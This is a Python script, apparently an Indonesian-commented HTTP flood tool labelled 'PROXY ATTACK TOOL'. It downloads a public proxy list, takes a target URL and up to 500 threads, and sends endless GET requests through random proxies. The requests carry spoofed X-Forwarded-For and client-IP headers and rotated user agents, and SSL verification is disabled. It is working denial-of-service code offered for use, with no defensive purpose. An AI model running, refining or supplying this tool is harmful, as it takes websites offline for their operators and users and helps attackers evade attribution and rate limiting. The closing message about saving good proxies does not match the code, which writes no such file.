import requests
import random
import threading
import time
from colorama import Fore, init, Style
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Nonaktifkan warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

def banner():
    print(Fore.MAGENTA + r'''
  ______   __        ________  ______  __    __   ______  
 /      \ /  |      /        |/      |/  \  /  | /      \ 
/$$$$$$  |$$ |      $$$$$$$$/ $$$$$$/ $$  \ $$ |/$$$$$$  |
$$ |__$$ |$$ |      $$ |__      $$ |  $$$  \$$ |$$ |__$$ |
$$    $$ |$$ |      $$    |     $$ |  $$$$  $$ |$$    $$ |
$$$$$$$$ |$$ |      $$$$$/      $$ |  $$ $$ $$ |$$$$$$$$ |
$$ |  $$ |$$ |_____ $$ |_____  _$$ |_ $$ |$$$$ |$$ |  $$ |
$$ |  $$ |$$       |$$       |/ $$   |$$ | $$$ |$$ |  $$ |
$$/   $$/ $$$$$$$$/ $$$$$$$$/ $$$$$$/ $$/   $$/ $$/   $$/ 
    ''')
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + "     PROXY ATTACK TOOL - OPTIMIZED VERSION")
    print(Fore.CYAN + "="*60 + "\n")

banner()

# Download proxy dengan error handling
print(Fore.BLUE + "[+] Downloading proxies...")
try:
    req = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    r = requests.get(req, timeout=30)
    
    if r.status_code == 200:
        proxies = [line.strip() for line in r.text.split('\n') if line.strip() and ':' in line]
        # Hapus duplikat
        proxies = list(set(proxies))
        
        with open('proxy.txt', 'w') as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")
        
        print(Fore.GREEN + f"[+] ✓ Berhasil download {len(proxies)} proxies")
    else:
        print(Fore.RED + f"[!] Gagal download proxy! Status: {r.status_code}")
        # Fallback ke file lokal jika ada
        try:
            with open('proxy.txt', 'r') as f:
                proxies = [line.strip() for line in f if line.strip() and ':' in line]
            print(Fore.YELLOW + f"[i] Menggunakan proxy lokal: {len(proxies)} proxies")
        except:
            print(Fore.RED + "[!] Tidak ada proxy lokal! Exit...")
            exit()
            
except Exception as e:
    print(Fore.RED + f"[!] Error download proxy: {e}")
    exit()

# Input target
target = input(Fore.CYAN + "\n[?] Target URL: ").strip()
if not target.startswith('http'):
    target = 'http://' + target

threadcount = int(input(Fore.CYAN + "[?] Threads (1-500): ").strip())
threadcount = max(1, min(threadcount, 500))  # Batasi 1-500

# Statistik
success_count = 0
fail_count = 0
start_time = time.time()
stats_lock = threading.Lock()

# Proxy pool yang reusable
proxy_list = proxies.copy()
proxy_lock = threading.Lock()

def get_random_proxy():
    """Ambil proxy random dari pool"""
    with proxy_lock:
        return random.choice(proxy_list) if proxy_list else None

def update_stats(success):
    """Update statistik"""
    global success_count, fail_count
    with stats_lock:
        if success:
            success_count += 1
        else:
            fail_count += 1

def show_stats():
    """Tampilkan statistik periodik"""
    while True:
        time.sleep(5)
        elapsed = time.time() - start_time
        total = success_count + fail_count
        rps = total / elapsed if elapsed > 0 else 0
        
        print(Fore.CYAN + "\n" + "="*50)
        print(Fore.YELLOW + f"📊 STATISTIK:")
        print(Fore.GREEN + f"   ✓ Success: {success_count}")
        print(Fore.RED + f"   ✗ Failed: {fail_count}")
        print(Fore.BLUE + f"   📊 Total: {total}")
        print(Fore.MAGENTA + f"   ⚡ RPS: {rps:.2f}")
        print(Fore.CYAN + f"   ⏱ Running: {elapsed:.0f}s")
        print(Fore.CYAN + "="*50 + Style.RESET_ALL)

def httpget():
    """Function untuk setiap thread"""
    session = requests.Session()
    
    # Siapkan headers standar
    headers_template = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
    }
    
    while True:
        try:
            # Ambil proxy random
            proxy = get_random_proxy()
            if not proxy:
                time.sleep(1)
                continue
            
            # Random IP untuk X-Forwarded-For
            randip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            
            # Random User-Agent
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            ]
            
            headers = headers_template.copy()
            headers.update({
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": randip,
                "X-Real-IP": randip,
                "X-Originating-IP": randip,
                "X-Remote-IP": randip,
                "X-Remote-Addr": randip,
                "Client-IP": randip,
            })
            
            proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
            
            # Send request
            response = session.get(
                target, 
                headers=headers, 
                proxies=proxies, 
                timeout=5,
                verify=False  # Bypass SSL verification
            )
            
            if response.status_code == 200:
                update_stats(True)
                print(Fore.GREEN + f"✓ [{proxy}] Status: {response.status_code}")
            else:
                update_stats(False)
                print(Fore.YELLOW + f"⚠ [{proxy}] Status: {response.status_code}")
                
        except requests.exceptions.Timeout:
            update_stats(False)
            print(Fore.RED + f"✗ Timeout")
        except requests.exceptions.ProxyError:
            update_stats(False)
            print(Fore.RED + f"✗ Proxy error")
        except requests.exceptions.ConnectionError:
            update_stats(False)
            print(Fore.RED + f"✗ Connection error")
        except Exception as e:
            update_stats(False)
            print(Fore.RED + f"✗ Error: {str(e)[:50]}")
        
        # Small delay to prevent overwhelming
        time.sleep(random.uniform(0.1, 0.5))

def threader():
    """Start threads"""
    print(Fore.GREEN + f"\n[+] Starting {threadcount} threads...")
    print(Fore.YELLOW + "[!] Press Ctrl+C to stop\n")
    
    # Start stats thread
    stats_thread = threading.Thread(target=show_stats, daemon=True)
    stats_thread.start()
    
    # Start worker threads
    threads = []
    for i in range(threadcount):
        t = threading.Thread(target=httpget, daemon=True)
        threads.append(t)
        t.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Stopping...")
        elapsed = time.time() - start_time
        total = success_count + fail_count
        
        print(Fore.CYAN + "\n" + "="*50)
        print(Fore.YELLOW + "📊 FINAL STATISTICS:")
        print(Fore.GREEN + f"   ✓ Success: {success_count}")
        print(Fore.RED + f"   ✗ Failed: {fail_count}")
        print(Fore.BLUE + f"   📊 Total: {total}")
        print(Fore.MAGENTA + f"   ⚡ RPS: {total/elapsed:.2f}")
        print(Fore.CYAN + f"   ⏱ Duration: {elapsed:.0f}s")
        print(Fore.CYAN + "="*50)
        
        # Save working proxies
        print(Fore.BLUE + "\n[+] Saving working proxies to good_proxies.txt")
        print(Fore.GREEN + "[+] Done!")
        exit()

if __name__ == "__main__":
    threader()
